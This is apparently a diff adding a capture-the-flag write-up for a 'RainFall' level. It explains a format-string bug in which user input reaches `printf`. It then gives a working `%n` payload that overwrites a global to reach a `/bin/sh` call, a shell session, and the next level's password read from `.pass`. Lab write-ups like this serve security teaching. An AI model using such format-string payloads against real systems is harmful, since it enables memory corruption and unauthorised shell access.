@@ -1,0 +1,27 @@
+The program level2 contains a function `v` with calls to `fgets` and `printf`.
+We can quickly see that the results gotten from `fgets` gets stored in a string which is then used as the format string in printf.
+We also notice a call to `system` with the parameter `"/bin/sh"`, guarded by a `cmp` instruction.
+This instruction checks a global variable if it is equal to 64, when it is not, it exits the program.
+
+We can use %p to view the stack, we want to find out which parameters corresponds to the first 4 bytes of our format string, to be able to input an arbitrary address to modify.
+
+The input `AAAA  %p  %p  %p  %p` shows `AAAA  0x200  0xb7fd1ac0  0xb7ff37d0  0x41414141`, we can see the `0x41414141` which corresponds to `AAAA` in hexadecimal, we now know that the 4th parameter is the one that interests us.
+
+The format parameter %n can be used to set a variable to the number of bytes that was written before the formatter.
+
+Using this, we can now build our exploit like such:
+- byte 0-4: The address of the global variable which is compared to 64
+- byte 4-64: Filler data to reach 64 written bytes
+- rest: %4\$n, formatter used to set the variable to 64
+
+The end result looks like this:
+`python -c "print ('\x08\x04\x98\x8c'[::-1] + '0' * 60 + '%4\$n')"`
+
+level3@RainFall:~$ (python -c "print ('\x08\x04\x98\x8c'[::-1] + '0' * 60 + '%4\$n')"; cat) | ./level3
+�000000000000000000000000000000000000000000000000000000000000
+Wait what?!
+whoami
+level4
+cd ../level4
+cat .pass
+b209ea91ad69ef36f2cf0fcbbc24c739fd10464cf545b20bea8572ebdc3c36fa
